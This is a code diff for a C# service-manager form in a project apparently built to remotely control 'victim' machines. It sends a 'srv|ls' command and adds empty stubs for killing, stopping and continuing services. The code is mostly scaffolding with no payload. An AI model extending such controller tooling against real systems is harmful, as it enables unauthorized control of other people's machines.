@@ -12,18 +12,37 @@ namespace EgoDrop
 {
     public partial class frmSrvMgr : Form
     {
-        public clsVictim m_victim { get; set; }
+        public clsAgent m_agent { get; init; }
 
-        public frmSrvMgr(clsVictim victim)
+        public frmSrvMgr(clsAgent agent)
         {
             InitializeComponent();
 
-            m_victim = victim;
+            m_agent = agent;
+        }
+
+        private List<string> m_lsLinuxColumns = new List<string>()
+        {
+
+        };
+        private List<string> m_lsWinColumns = new List<string>()
+        {
+
+        };
+
+        private struct stLinuxServiceInfo
+        {
+
+        }
+
+        private struct stWinServiceInfo
+        {
+
         }
 
         private void fnRecv(clsListener listener, clsVictim victim, string szSrcVictimID, List<string> lsMsg)
         {
-            if (!clsTools.fnbSameVictim(victim, m_victim))
+            if (!string.Equals(m_agent.m_szVictimID, szSrcVictimID))
                 return;
 
             Invoke(new Action(() =>
@@ -32,11 +51,12 @@ namespace EgoDrop
                 {
                     if (lsMsg[1] == "ls")
                     {
-                        var ls2d = clsEZData.fn2dLB64Decode(lsMsg[2]);
-                        foreach (var ls in ls2d)
+                        if (m_agent.m_bUnixlike)
                         {
-                            MessageBox.Show(ls[0]);
+
                         }
+
+                        toolStripStatusLabel1.Text = $"Service[{listView1.Items.Count}]";
                     }
                 }
             }));
@@ -44,12 +64,54 @@ namespace EgoDrop
 
         private void fnGetServices()
         {
-            m_victim.fnSendCommand("srv|ls");
+            toolStripStatusLabel1.Text = "Loading...";
+
+            listView1.Items.Clear();
+            m_agent.fnSendCommand("srv|ls");
+        }
+
+
+        private void fnKillService(string szName)
+        {
+
+        }
+
+        private void fnStopService(string szName)
+        {
+
+        }
+
+        private void fnContiService(string szName)
+        {
+
         }
 
         void fnSetup()
         {
-            m_victim.m_listener.evtReceivedMessage += fnRecv;
+            //Controls
+            toolStripStatusLabel1.Text = "Loading...";
+            listView1.View = View.Details;
+            listView1.Items.Clear();
+            listView1.Columns.Clear();
+
+            if (m_agent.m_bUnixlike)
+            {
+                for (int i = 0; i < m_lsLinuxColumns.Count; i++)
+                {
+                    listView1.Columns.Add(m_lsLinuxColumns[i]);
+                    listView1.Columns[i].Width = 200;
+                }
+            }
+            else
+            {
+                for (int i = 0; i < m_lsWinColumns.Count; i++)
+                {
+                    listView1.Columns.Add(m_lsWinColumns[i]);
+                    listView1.Columns[i].Width = 200;
+                }
+            }
+
+            m_agent.m_victim.m_listener.evtReceivedMessage += fnRecv;
 
             fnGetServices();
         }
@@ -61,7 +123,7 @@ namespace EgoDrop
 
         private void frmSrvMgr_FormClosed(object sender, FormClosedEventArgs e)
         {
-            m_victim.m_listener.evtReceivedMessage -= fnRecv;
+            m_agent.m_victim.m_listener.evtReceivedMessage -= fnRecv;
         }
     }
 }
